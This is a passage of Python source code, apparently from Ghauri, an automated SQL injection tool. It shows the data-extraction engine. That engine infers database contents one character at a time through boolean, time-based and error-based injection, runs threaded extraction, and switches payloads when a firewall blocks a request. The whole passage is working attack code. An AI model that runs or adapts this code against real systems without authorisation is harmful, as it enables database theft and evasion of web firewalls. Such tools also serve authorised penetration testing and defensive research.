        expression_payload=None,
        queryable=None,
        chars="",
        offset=0,
        list_of_chars=None,
        vector_type=None,
        retry=3,
        base=None,
        *args,
        **kwargs,
    ):
        # need to implement retry mechanism in case of http connection related errors..
        character = ""
        start = 0
        end = len(list_of_chars)
        http_firewall_code_counter = 0
        error_msg = None
        retry_on_error = 0
        sleep_time = conf.timesec
        while start < end:
            # if http_firewall_code_counter > 2:
            #     message = f"{error_msg} - {http_firewall_code_counter} time(s)"
            #     logger.warning(f"HTTP error code detected during run:")
            #     choice = logger.read_input(
            #         f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
            #         batch=False,
            #         user_input="C",
            #     )
            #     if choice == "q":
            #         logger.error("user quit")
            #         logger.end("ending")
            #         exit(0)
            #     if choice == "c":
            #         http_firewall_code_counter = 0
            # if retry_on_error >= retry:
            #     logger.warning(f"Ghauri detected connection errors multiple times")
            #     choice = logger.read_input(
            #         f"how do you want to proceed? [(C)continue/(q)uit] ",
            #         batch=False,
            #         user_input="C",
            #     )
            #     if choice == "q":
            #         logger.error("user quit")
            #         logger.end("ending")
            #         exit(0)
            #     if choice == "c":
            #         retry_on_error = 0
            ascii_char = list_of_chars[start]
            if delay > 0:
                time.sleep(delay)
            logger.progress(f"retrieved: {chars}{ascii_char}")
            condition = expression_payload.format(
                query=queryable, position=offset, char=ord(ascii_char)
            )
            expression = vector.replace("[INFERENCE]", f"{condition}").replace(
                "[SLEEPTIME]", f"{sleep_time}"
            )
            # logger.payload(f"{expression}")
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                # if attack.status_code in [403, 406]:
                #     logger.critical(
                #         f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
                #     )
                #     time.sleep(0.5)
                #     error_msg = attack.error_msg
                #     http_firewall_code_counter += 1
                #     continue
                start += 1
                if attack01 and vector_type == "boolean_vector":
                    bool_retval = check_boolean_responses(
                        base,
                        attack,
                        attack01,
                        match_string=match_string,
                        not_match_string=not_match_string,
                        text_only=text_only,
                    )
                    result = bool_retval.vulnerable
                    if result:
                        character += str(ascii_char)
                        break
                if vector_type == "time_vector":
                    response_time = attack.response_time
                    logger.debug(
                        f"sleep time: {sleep_time}, response time: {response_time}"
                    )
                    if response_time >= sleep_time:
                        character += str(ascii_char)
                        break
            except KeyboardInterrupt as error:
                logger.warning("user aborted during data extraction phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if quest and quest == "e":
                    raise error
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during detection phase. Ghauri is going to retry"
                )
                retry_on_error += 1
        return character

    def fetch_noc(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        suppress_output=False,
        text_only=False,
        vector_type=None,
    ):

        noc = 0
        working_query = ""
        logger.debug("fetching number of characters in length of query..")
        chars_extraction_payloads = NUMBER_OF_CHARACTERS_PAYLOADS.get(backend)
        if isinstance(chars_extraction_payloads, str):
            chars_extraction_payloads = [chars_extraction_payloads]
        for value in chars_extraction_payloads:
            is_noc_payload_found = False
            for entry in payloads:
                is_noc_found = False
                start_pos = 1
                stop = 10
                while start_pos < stop:
                    if delay > 0:
                        time.sleep(delay)
                    sleep_time = conf.timesec
                    condition = value.format(query=entry, char=start_pos)
                    expression = vector.replace("[INFERENCE]", f"{condition}").replace(
                        "[SLEEPTIME]", f"{sleep_time}"
                    )
                    # logger.payload(f"{expression}")
                    try:
                        attack = inject_expression(
                            url=url,
                            data=data,
                            proxy=proxy,
                            delay=delay,
                            timesec=timesec,
                            timeout=timeout,
                            headers=headers,
                            parameter=parameter,
                            expression=expression,
                            is_multipart=is_multipart,
                            injection_type=injection_type,
                        )
                    except KeyboardInterrupt as error:
                        logger.error(
                            "user aborted during number of characters in length query retrieval."
                        )
                        logger.end("ending")
                        exit(0)
                    if attack.status_code in [403, 406]:
                        # move towards next payload in a list as current payload is restricted by firewall
                        logger.debug(
                            "moving towards next payload in a list as current payload is restricted by firewall."
                        )
                        break
                    if attack01 and vector_type == "boolean_vector":
                        bool_retval = check_boolean_responses(
                            base,
                            attack,
                            attack01,
                            code=code,
                            match_string=match_string,
                            not_match_string=not_match_string,
                            text_only=text_only,
                        )
                        result = bool_retval.vulnerable
                        if result:
                            working_query = entry
                            logger.debug(
                                f"retrieved number of characters in length query {start_pos}"
                            )
                            noc = start_pos
                            is_noc_found = True
                            break
                    if vector_type == "time_vector":
                        response_time = attack.response_time
                        logger.debug(
                            f"sleep time: {sleep_time}, response time: {response_time}"
                        )
                        if response_time >= sleep_time:
                            working_query = entry
                            logger.debug(
                                f"retrieved number of characters in length query {start_pos}"
                            )
                            noc = start_pos
                            is_noc_found = True
                            break
                    start_pos += 1
                if is_noc_found:
                    is_noc_payload_found = True
                    break
            if is_noc_payload_found:
                break
        return noc, working_query

    def fetch_length(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        suppress_output=False,
        query_check=False,
        text_only=False,
        vector_type=None,
    ):

        noc, _ = self.fetch_noc(
            url,
            data,
            vector,
            parameter,
            headers,
            base,
            injection_type,
            payloads=payloads,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack01=attack01,
            code=code,
            match_string=match_string,
            not_match_string=not_match_string,
            suppress_output=suppress_output,
            text_only=text_only,
            vector_type=vector_type,
        )
        if query_check and noc > 0:
            return _
        if noc < 1:
            logger.debug(
                "Ghauri couldn't determine the number if character(s) in length query"
            )
        length = 0
        if noc >= 1:
            if not suppress_output:
                logger.info(f"retrieving the length of query output")
            length_extraction_payloads = LENGTH_PAYLOADS.get(backend)
            if isinstance(length_extraction_payloads, str):
                length_extraction_payloads = [length_extraction_payloads]
            attack_url = url
            attack_data = data
            attack_headers = headers
            for value in length_extraction_payloads:
                is_length_found = False
                for entry in payloads:
                    chars = ""
                    pos = 1
                    total_number_of_characters = noc + 1
                    while pos < total_number_of_characters:
                        if attack01 and vector_type == "boolean_vector":
                            try:
                                retval = self._binary_search(
                                    url=url,
                                    data=data,
                                    vector=vector,
                                    parameter=parameter,
                                    headers=headers,
                                    base=base,
                                    injection_type=injection_type,
                                    delay=delay,
                                    timesec=timesec,
                                    timeout=timeout,
                                    proxy=proxy,
                                    attack01=attack01,
                                    code=code,
                                    match_string=match_string,
                                    not_match_string=not_match_string,
                                    is_multipart=is_multipart,
                                    suppress_output=suppress_output,
                                    query_check=query_check,
                                    minimum=48,
                                    maximum=58,
                                    offset=pos,
                                    expression_payload=value,
                                    queryable=entry,
                                    chars=chars,
                                    text_only=text_only,
                                    vector_type=vector_type,
                                )
                                if retval:
                                    is_valid = self.validate_character(
                                        url=url,
                                        data=data,
                                        vector=vector,
                                        parameter=parameter,
                                        headers=headers,
                                        base=base,
                                        injection_type=injection_type,
                                        proxy=proxy,
                                        is_multipart=is_multipart,
                                        timeout=timeout,
                                        delay=delay,
                                        timesec=timesec,
                                        identified_character=retval,
                                        vector_type=vector_type,
                                        offset=pos,
                                        expression_payload=value,
                                        queryable=entry,
                                        code=code,
                                        match_string=match_string,
                                        not_match_string=not_match_string,
                                        attack01=attack01,
                                    )
                                    if not is_valid:
                                        logger.warning(
                                            "invalid character detected, retrying.."
                                        )
                                        retval = self._linear_search(
                                            url=url,
                                            data=data,
                                            vector=vector,
                                            parameter=parameter,
                                            headers=headers,
                                            injection_type=injection_type,
                                            proxy=proxy,
                                            attack01=attack01,
                                            is_multipart=is_multipart,
                                            timeout=timeout,
                                            match_string=match_string,
                                            not_match_string=not_match_string,
                                            text_only=text_only,
                                            delay=delay,
                                            timesec=timesec,
                                            suppress_output=suppress_output,
                                            expression_payload=value,
                                            queryable=entry,
                                            chars=chars,
                                            offset=pos,
                                            list_of_chars="2013456789",
                                            vector_type=vector_type,
                                            base=base,
                                        )
                                        if retval:
                                            is_valid = self.validate_character(
                                                url=url,
                                                data=data,
                                                vector=vector,
                                                parameter=parameter,
                                                headers=headers,
                                                base=base,
                                                injection_type=injection_type,
                                                proxy=proxy,
                                                is_multipart=is_multipart,
                                                timeout=timeout,
                                                delay=delay,
                                                timesec=timesec,
                                                identified_character=retval,
                                                vector_type=vector_type,
                                                offset=pos,
                                                expression_payload=value,
                                                queryable=entry,
                                                code=code,
                                                match_string=match_string,
                                                not_match_string=not_match_string,
                                                attack01=attack01,
                                            )
                                if is_valid:
                                    pos += 1
                                    chars += retval
                                    logger.debug(f"character found: {chars}")
                            except KeyboardInterrupt:
                                is_length_found = True
                                length = 0
                                break
                        if vector_type == "time_vector":
                            try:
                                retval = self._linear_search(
                                    url=url,
                                    data=data,
                                    vector=vector,
                                    parameter=parameter,
                                    headers=headers,
                                    injection_type=injection_type,
                                    proxy=proxy,
                                    is_multipart=is_multipart,
                                    timeout=timeout,
                                    delay=delay,
                                    timesec=timesec,
                                    suppress_output=suppress_output,
                                    expression_payload=value,
                                    queryable=entry,
                                    chars=chars,
                                    offset=pos,
                                    list_of_chars="2013456789",
                                    vector_type=vector_type,
                                )
                                pos += 1
                                chars += retval
                                logger.debug(f"character found: '{str(chars)}'")
                            except KeyboardInterrupt:
                                is_length_found = True
                                length = 0
                                break
                    if len(chars) == noc:
                        if not suppress_output:
                            logger.info(f"retrieved: {chars}")
                        length = int(chars) if chars.isdigit() else 0
                        is_length_found = True
                        break
                if is_length_found:
                    break
        return length

    def fetch_using_error_based_vector(
        self,
        url,
        data,
        parameter,
        headers,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        suppress_output=False,
        query_check=False,
        text_only=False,
        retry=3,
        dump_type=None,
    ):
        PayloadResponse = collections.namedtuple(
            "PayloadResponse",
            ["ok", "error", "result", "payload", "resumed"],
        )
        _temp = PayloadResponse(
            ok=False, error="", result="", payload="", resumed=False
        )
        error_based_in_vectors = bool("error_vector" in conf.vectors)
        start = 0
        end = len(payloads)
        http_firewall_code_counter = 0
        error_msg = None
        retry_on_error = 0
        is_resumed = False
        if dump_type and not conf.fresh_queries:
            retval_session = session.fetchall(
                session_filepath=conf.session_filepath,
                query="SELECT * FROM storage WHERE `type`=?",
                values=(dump_type,),
            )
            if retval_session:
                retval_session = retval_session.pop()
                is_resumed = True
                result = retval_session.get("value")
                length = retval_session.get("length")
                logger.progress(f"resumed: {result}")
                last_row_id = retval_session.get("id")
                if len(result) == length:
                    _temp = PayloadResponse(
                        ok=True,
                        error="",
                        result=result,
                        payload="",
                        resumed=is_resumed,
                    )
                    return _temp
        if error_based_in_vectors:
            vector = conf.vectors.get("error_vector")
            while start < end:
                entry = payloads[start]
                response_string = ""
                if delay > 0:
                    time.sleep(delay)
                expression = vector.replace("[INFERENCE]", f"{entry}")
                if backend == "Microsoft SQL Server":
                    expression = expression.replace("+", "%2b")
                # logger.payload(f"{expression}")
                try:
                    attack = inject_expression(
                        url=url,
                        data=data,
                        proxy=proxy,
                        delay=delay,
                        timesec=timesec,
                        timeout=timeout,
                        headers=headers,
                        parameter=parameter,
                        expression=expression,
                        is_multipart=is_multipart,
                        injection_type=injection_type,
                    )
                    response_string = attack.filtered_text if text_only else attack.text
                    start += 1
                except KeyboardInterrupt as error:
                    logger.warning("user aborted during data extraction phase")
                    quest = logger.read_input(
                        "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                        batch=False,
                        user_input="C",
                    )
                    if quest and quest == "e":
                        _temp = PayloadResponse(
                            ok=False,
                            error="user_ended",
                            result="",
                            payload="",
                            resumed=is_resumed,
                        )
                        return _temp
                    if quest and quest == "q":
                        logger.error("user quit")
                        logger.end("ending")
                        exit(0)
                except ConnectionAbortedError as e:
                    logger.critical(
                        f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except ConnectionRefusedError as e:
                    logger.critical(
                        f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except ConnectionResetError as e:
                    logger.critical(
                        f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except Exception as error:
                    logger.critical(
                        f"error {error}, during detection phase. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                retval = search_regex(
                    pattern=(
                        REGEX_XPATH,
                        REGEX_ERROR_BASED,
                        REGEX_BIGINT_BASED,
                        REGEX_DOUBLE_BASED,
                        REGEX_GEOMETRIC_BASED,
                        REGEX_GTID_BASED,
                        REGEX_JSON_KEYS,
                        REGEX_GENERIC,
                        REGEX_MSSQL_STRING,
                        REGEX_GENERIC_ERRORS,
                    ),
                    string=response_string,
                    default=None,
                    group="error_based_response",
                )
                if retval:
                    if retval != "<blank_value>":
                        if backend == "Microsoft SQL Server":
                            if entry.endswith("sysobjects)") or entry.endswith(
                                "..syscolumns)"
                            ):
                                logger.debug(
                                    f"entries found with query '{entry}': {retval}, setting the return to 1 as we can't use where clause in query.."
                                )
                                retval = "1"
                                logger.warning(
                                    "the SQL query provided does not return any output"
                                )
                                logger.warning(
                                    "it was not possible to count the number of entries for the SQL query provided. Ghauri will assume that it returns only one entry"
                                )
                    try:
                        if dump_type and not conf.fresh_queries:
                            session.dump(
                                session_filepath=conf.session_filepath,
                                query=STORAGE,
                                values=(
                                    retval,
                                    len(retval),
                                    dump_type,
                                ),
                            )
                    except Exception as error:
                        logger.warning(error)
                    _temp = PayloadResponse(
                        ok=True,
                        error="",
                        result=retval,
                        payload=entry,
                        resumed=is_resumed,
                    )
                    break
        return _temp

    def fetch_characters(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        suppress_output=False,
        query_check=False,
        list_of_chars=None,
        text_only=False,
        dump_type=None,
    ):
        PayloadResponse = collections.namedtuple(
            "PayloadResponse",
            ["ok", "error", "result", "payload", "resumed"],
        )
        _temp = PayloadResponse(
            ok=False, error="", result="", payload="", resumed=False
        )
        other_vectors = bool(
            "boolean_vector" in conf.vectors or "time_vector" in conf.vectors
        )
        retval_error = self.fetch_using_error_based_vector(
            url,
            data,
            parameter,
            headers,
            injection_type,
            payloads,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            suppress_output=suppress_output,
            query_check=query_check,
            text_only=text_only,
            dump_type=dump_type,
        )
        if retval_error.ok:
            _temp_error = PayloadResponse(
                ok=retval_error.ok,
                error=retval_error.error,
                result=retval_error.result,
                payload=retval_error.payload,
                resumed=retval_error.resumed,
            )
            return _temp_error
        if not retval_error.ok:
            if retval_error.error == "user_ended":
                _temp_error = PayloadResponse(
                    ok=retval_error.ok,
                    error=retval_error.error,
                    result=retval_error.result,
                    payload=retval_error.payload,
                    resumed=retval_error.resumed,
                )
                return _temp_error
            # if other_vectors:
            #     logger.debug(
            #         "ghauri is going to use other injected vectors payloads if any."
            #     )
        if not list_of_chars:
            list_of_chars = "._-1234567890aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ@+!#$%^&*()+"
        data_extraction_payloads = DATA_EXTRACTION_PAYLOADS.get(backend)
        if isinstance(data_extraction_payloads, dict):
            data_extraction_payloads = [data_extraction_payloads]
        attack_url = url
        attack_data = data
        attack_headers = headers
        user_aborted = False
        change_algo_on_invalid_character = False
        invalid_character_detection_counter = 0
        bool_invalid_character_counter = 0
        is_change_algo_notified = False
        binary_search = False
        in_based_search = False
        linear_search = False
        between_based_search = False
        is_resumed = False
        start_pos = 1
        start_chars = ""
        if dump_type and not conf.fresh_queries:
            retval_session = session.fetchall(
                session_filepath=conf.session_filepath,
                query="SELECT * FROM storage WHERE `type`=?",
                values=(dump_type,),
            )
            if retval_session:
                retval_session = retval_session.pop()
                is_resumed = True
                _v = retval_session.get("value")
                length = retval_session.get("length")
                start_pos = len(_v) + 1
                start_chars = _v
                logger.progress(f"resumed: {_v}")
                last_row_id = retval_session.get("id")
                if len(_v) == length:
                    _temp = PayloadResponse(
                        ok=True, error="", result=_v, payload="", resumed=is_resumed
                    )
                    return _temp
        for vector_type, vector in conf.vectors.items():
            if vector_type in ["error_vector"]:
                continue
            if not is_resumed:
                length = self.fetch_length(
                    url,
                    data,
                    vector,
                    parameter,
                    headers,
                    base,
                    injection_type,
                    payloads=payloads,
                    backend=backend,
                    proxy=proxy,
                    is_multipart=is_multipart,
                    timeout=timeout,
                    delay=delay,
                    timesec=timesec,
                    attack01=attack01,
                    code=code,
                    match_string=match_string,
                    not_match_string=not_match_string,
                    query_check=query_check,
                    suppress_output=suppress_output,
                    text_only=text_only,
                    vector_type=vector_type,
                )
            if length == 0:
                logger.warning(
                    "it was not possible to extract query output length for the SQL query provided."
                )
                continue
            if query_check:
                return PayloadResponse(
                    ok=True, error="", result="", payload=length, resumed=False
                )
            try:
                if not is_resumed and dump_type and not conf.fresh_queries:
                    last_row_id = session.dump(
                        session_filepath=conf.session_filepath,
                        query=STORAGE,
                        values=(
                            "",
                            length,
                            dump_type,
                        ),
                    )
            except Exception as error:
                logger.warning(error)
            is_done_with_vector = False
            retval_check = self._check_operator(
                url,
                data,
                vector,
                parameter,
                headers,
                base,
                injection_type,
                proxy=proxy,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                attack01=attack01,
                match_string=match_string,
                not_match_string=not_match_string,
                vector_type=vector_type,
                text_only=text_only,
            )
            if retval_check.ok:
                binary_search = retval_check.binary_search
                in_based_search = retval_check.in_based_search
                linear_search = retval_check.linear_search
                between_based_search = retval_check.between_based_search
            if not retval_check.ok:
                logger.critical(
                    "ghauri will not be able to extract data as '=', 'IN' and '>' all are filtered by back-end server.."
                )
                logger.end("ending")
                exit(0)
            for entries in data_extraction_payloads:
                is_extracted = False
                for _, value in entries.items():
                    is_char_found = False
                    for entry in payloads:
                        chars = start_chars
                        pos = start_pos
                        total_length = length + 1
                        if (
                            conf.threads
                            and not binary_search
                            and not in_based_search
                            and not between_based_search
                        ):
                            logger.debug(
                                "Ghauri will use a fallback leaner search to guess character(s), adjusting threads to 1"
                            )
                            conf.threads = None
                        if conf.threads and vector_type == "boolean_vector":
                            if not conf.thread_warning:
                                logger.debug(
                                    "it is recommended not to use threads for data exfiltration, it could cause harm to backend DBMS or result in incorrect character(s) guessing."
                                )
                                conf.thread_warning = True
                            [
                                conf._thread_chars_query.update({offset: "_"})
                                for offset in range(pos, total_length)
                            ]
                            # dirty hack to add characters at position so that threads won't run forever to figure out characters..
                            if chars and len(chars) >= 1:
                                logger.debug("appending characters found already")
                                for _, ch in enumerate(chars):
                                    conf._thread_chars_query.update({_ + 1: ch})
                            conf._thread_chars_query = collections.OrderedDict(
                                sorted(conf._thread_chars_query.items())
                            )
                            if conf.threads > conf._max_threads:
                                conf.threads = conf._max_threads
                                if not conf.max_threads_warning:
                                    logger.warning(
                                        f"Ghauri recommends using threads upto {conf._max_threads}. adjusting '--threads=\"{conf._max_threads}\"'."
                                    )
                                    conf.max_threads_warning = True
                            with futures.ThreadPoolExecutor(
                                max_workers=conf.threads
                            ) as ex:
                                exfiltration_func = None
                                # we will only use IN and > for exfitration of data using threads
                                # using linear search might cause issues with backend dbms as the complexity of this technique is high
                                if binary_search:
                                    exfiltration_func = self._binary_search
                                if in_based_search:
                                    exfiltration_func = self._search_using_in_operator
                                if between_based_search:
                                    exfiltration_func = (
                                        self._search_using_between_operator
                                    )
                                exec_map = {
                                    ex.submit(
                                        exfiltration_func,
                                        url=url,
                                        data=data,
                                        vector=vector,
                                        parameter=parameter,
                                        headers=headers,
                                        base=base,
                                        injection_type=injection_type,
                                        delay=delay,
                                        timesec=timesec,
                                        timeout=timeout,
                                        proxy=proxy,
                                        attack01=attack01,
                                        code=code,
                                        match_string=match_string,
                                        not_match_string=not_match_string,
                                        is_multipart=is_multipart,
                                        suppress_output=suppress_output,
                                        query_check=query_check,
                                        minimum=32,
                                        maximum=127,
                                        offset=offset,
                                        expression_payload=value,
                                        queryable=entry,
                                        chars=chars,
                                        text_only=text_only,
                                        vector_type=vector_type,
                                    ): offset
                                    for offset in range(pos, total_length)
                                }
                                try:
                                    for future in futures.as_completed(exec_map):
                                        offset = exec_map[future]
                                        logger.progress("retrieved: {}".format(chars))
                                        try:
                                            character = future.result()
                                        except Exception as exc:
                                            logger.error(
                                                f"    * generated an exception: '{exc}' on offset '{offset}'"
                                            )
                                        except KeyboardInterrupt as error:
                                            raise error
                                        else:
                                            if (
                                                character
                                                and character != ""
                                                and character is not None
                                            ):
                                                conf._thread_chars_query.update(
                                                    {offset: character}
                                                )
                                except KeyboardInterrupt as error:
                                    logger.error(
                                        "user aborted, terminating threads gracefully"
                                    )
                                    raise error
                                chars = "".join(
                                    [
                                        str(i)
                                        for i in collections.OrderedDict(
                                            sorted(conf._thread_chars_query.items())
                                        ).values()
                                    ]
                                )
                                conf._thread_chars_query = {}
                                with conf.lock:
                                    try:
                                        if (
                                            dump_type
                                            and chars
                                            and not conf.fresh_queries
                                        ):
                                            session.dump(
                                                session_filepath=conf.session_filepath,
                                                query=STORAGE_UPDATE,
                                                values=(
                                                    chars,
                                                    last_row_id,
                                                    dump_type,
                                                ),
                                            )
                                    except Exception as error:
                                        logger.warning(error)
                                    logger.debug(f"character(s) found: '{chars}'")
                        else:
                            while pos < total_length:
                                start_pos = pos
                                if attack01 and vector_type == "boolean_vector":
                                    # extract characters using binary search algorithm
                                    try:
                                        if binary_search:
                                            retval = self._binary_search(
                                                url=url,
                                                data=data,
                                                vector=vector,
                                                parameter=parameter,
                                                headers=headers,
                                                base=base,
                                                injection_type=injection_type,
                                                delay=delay,
                                                timesec=timesec,
                                                timeout=timeout,
                                                proxy=proxy,
                                                attack01=attack01,
                                                code=code,
                                                match_string=match_string,
                                                not_match_string=not_match_string,
                                                is_multipart=is_multipart,
                                                suppress_output=suppress_output,
                                                query_check=query_check,
                                                minimum=32,
                                                maximum=127,
                                                offset=pos,
                                                expression_payload=value,
                                                queryable=entry,
                                                chars=chars,
                                                text_only=text_only,
                                                vector_type=vector_type,
                                            )
                                            if retval:
                                                is_valid = self.validate_character(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    proxy=proxy,
                                                    is_multipart=is_multipart,
                                                    timeout=timeout,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    identified_character=retval,
                                                    vector_type=vector_type,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                    code=code,
                                                    match_string=match_string,
                                                    not_match_string=not_match_string,
                                                    attack01=attack01,
                                                )
                                                if not is_valid:
                                                    logger.warning(
                                                        "invalid character detected, retrying."
                                                    )
                                                    bool_invalid_character_counter += 1
                                                    binary_search = False
                                                    between_based_search = True
                                                    in_based_search = False
                                                    linear_search = False
                                                if is_valid:
                                                    pos += 1
                                                    chars += retval
                                        elif between_based_search:
                                            retval = (
                                                self._search_using_between_operator(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    timeout=timeout,
                                                    proxy=proxy,
                                                    attack01=attack01,
                                                    code=code,
                                                    match_string=match_string,
                                                    not_match_string=not_match_string,
                                                    is_multipart=is_multipart,
                                                    suppress_output=suppress_output,
                                                    query_check=query_check,
                                                    minimum=32,
                                                    maximum=127,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                    chars=chars,
                                                    text_only=text_only,
                                                    vector_type=vector_type,
                                                )
                                            )
                                            if retval:
                                                is_valid = self.validate_character(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    proxy=proxy,
                                                    is_multipart=is_multipart,
                                                    timeout=timeout,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    identified_character=retval,
                                                    vector_type=vector_type,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                    code=code,
                                                    match_string=match_string,
                                                    not_match_string=not_match_string,
                                                    attack01=attack01,
                                                )
                                                if not is_valid:
                                                    logger.warning(
                                                        "invalid character detected, retrying."
                                                    )
                                                    bool_invalid_character_counter += 1
                                                    binary_search = False
                                                    between_based_search = False
                                                    in_based_search = True
                                                    linear_search = False
                                                if is_valid:
                                                    pos += 1
                                                    chars += retval
                                        elif in_based_search:
                                            retval = self._search_using_in_operator(
                                                url=url,
                                                data=data,
                                                vector=vector,
                                                parameter=parameter,
                                                headers=headers,
                                                base=base,
                                                injection_type=injection_type,
                                                delay=delay,
                                                timesec=timesec,
                                                timeout=timeout,
                                                proxy=proxy,
                                                attack01=attack01,
                                                match_string=match_string,
                                                not_match_string=not_match_string,
                                                text_only=text_only,
                                                is_multipart=is_multipart,
                                                suppress_output=suppress_output,
                                                query_check=query_check,
                                                minimum=32,
                                                maximum=127,
                                                offset=pos,
                                                expression_payload=value,
                                                queryable=entry,
                                                chars=chars,
                                                vector_type=vector_type,
                                            )
                                            if retval:
                                                is_valid = self.validate_character(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    proxy=proxy,
                                                    is_multipart=is_multipart,
                                                    timeout=timeout,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    identified_character=retval,
                                                    vector_type=vector_type,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                    code=code,
                                                    match_string=match_string,
                                                    not_match_string=not_match_string,
                                                    attack01=attack01,
                                                )
                                                if not is_valid:
                                                    logger.warning(
                                                        "invalid character detected, retrying."
                                                    )
                                                    bool_invalid_character_counter += 1
                                                    binary_search = False
                                                    in_based_search = False
                                                    linear_search = True
                                                if is_valid:
                                                    pos += 1
                                                    chars += retval
                                        else:
                                            retval = self._linear_search(
                                                url=url,
                                                data=data,
                                                vector=vector,
                                                parameter=parameter,
                                                headers=headers,
                                                injection_type=injection_type,
                                                proxy=proxy,
                                                attack01=attack01,
                                                is_multipart=is_multipart,
                                                timeout=timeout,
                                                match_string=match_string,
                                                not_match_string=not_match_string,
                                                text_only=text_only,
                                                delay=delay,
                                                timesec=timesec,
                                                suppress_output=suppress_output,
                                                expression_payload=value,
                                                queryable=entry,
                                                chars=chars,
                                                offset=pos,
                                                list_of_chars=list_of_chars,
                                                vector_type=vector_type,
                                                base=base,
                                            )
                                            if retval:
                                                is_valid = self.validate_character(
                                                    url=url,
                                                    data=data,
                                                    vector=vector,
                                                    parameter=parameter,
                                                    headers=headers,
                                                    base=base,
                                                    injection_type=injection_type,
                                                    proxy=proxy,
                                                    is_multipart=is_multipart,
                                                    timeout=timeout,
                                                    delay=delay,
                                                    timesec=timesec,
                                                    identified_character=retval,
                                                    vector_type=vector_type,
                                                    offset=pos,
                                                    expression_payload=value,
                                                    queryable=entry,
                                                    code=code,
                                                    match_string=match_string,
                                                    not_match_string=not_match_string,
                                                    attack01=attack01,
                                                )
                                                if not is_valid:
                                                    logger.warning(
                                                        "invalid character detected, retrying."
                                                    )
                                                    bool_invalid_character_counter += 1
                                                    binary_search = (
                                                        retval_check.binary_search
                                                    )
                                                    in_based_search = (
                                                        retval_check.in_based_search
                                                    )
                                                    linear_search = (
                                                        retval_check.linear_search
                                                    )
                                                if is_valid:
                                                    pos += 1
                                                    chars += retval
                                        try:
                                            if bool_invalid_character_counter >= 3:
                                                logger.debug(
                                                    "it seems the current payload is filtered out by some sort of WAF/IDS."
                                                )
                                                break
                                            if (
                                                dump_type
                                                and chars
                                                and not conf.fresh_queries
                                            ):
                                                session.dump(
                                                    session_filepath=conf.session_filepath,
                                                    query=STORAGE_UPDATE,
                                                    values=(
                                                        chars,
                                                        last_row_id,
                                                        dump_type,
                                                    ),
                                                )
                                        except Exception as error:
                                            logger.warning(error)
                                        logger.debug(
                                            f"character(s) found: '{str(chars)}'"
                                        )
                                    except KeyboardInterrupt:
                                        is_char_found = True
                                        is_extracted = True
                                        is_done_with_vector = True
                                        if chars and len(chars) > 0:
                                            logger.info(f"retrieved: '{chars}'")
                                        _temp = PayloadResponse(
                                            ok=False,
                                            error="user_ended",
                                            result=chars,
                                            payload=entry,
                                            resumed=False,
                                        )
                                        break
                                if vector_type == "time_vector":
                                    try:
                                        if binary_search:
                                            retval = self._binary_search(
                                                url=url,
                                                data=data,
